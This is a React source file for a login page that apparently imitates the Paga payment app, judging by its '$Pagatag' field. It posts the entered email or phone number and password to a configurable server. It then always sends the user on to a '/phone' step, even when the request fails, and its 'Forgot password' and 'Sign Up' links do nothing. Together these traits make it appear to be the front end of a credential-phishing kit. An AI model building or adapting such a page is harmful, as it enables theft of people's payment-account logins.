import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css";
import "../App.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  email: yup.string().required("email, phone number or $Pagatag is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const submitForm = (data) => {
    setLoading(true);
    // Store email in localStorage
    localStorage.setItem("userEmail", data.email);

    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        console.log(data);
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        navigate("/phone");
        setLoading(false);
      });
  };

  return (
    <div className="container">
      <div className="backArrow">
        <i className="fa-solid fa-arrow-left"></i>
      </div>
      <div className="contentSec">
        <div className="title">Log in to your account</div>
        <div className="subText">Glad you're back, let's get to business</div>
      </div>
      <div className="loginWrapper">
        <div className="loginSec">
          <form onSubmit={handleSubmit(submitForm)}>
            <label htmlFor="email">Email / Phone Number</label>
            <div className="formInput">
              <input
                name="email"
                type="text"
                placeholder="Enter your email or  phone number"
                {...register("email")}
              />
            </div>
            <FormErrMsg errors={errors} inputName="email" />

            <label htmlFor="password">Password</label>
            <div className="formInput">
              <input
                name="password"
                type={showPassword ? "text" : "password"}
                placeholder="Enter your password"
                {...register("password")}
              />
              <i
                className={
                  showPassword ? "fa-regular fa-eye-slash" : "fa-regular fa-eye"
                }
                onClick={() => setShowPassword(!showPassword)}
              ></i>
            </div>
            <FormErrMsg errors={errors} inputName="password" />

            <div className="fp">Forgot password?</div>

            <button type="submit" disabled={loading} className="loginBtn">
              {loading ? "Loading..." : "Log in"}
            </button>

            <div className="orDivider">
              <span>or</span>
            </div>

            <button type="button" className="phoneLoginBtn">
              Log in with phone number
            </button>

            <div className="dontHveAcc">
              Don't have an account? <b>Sign Up</b>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Home;

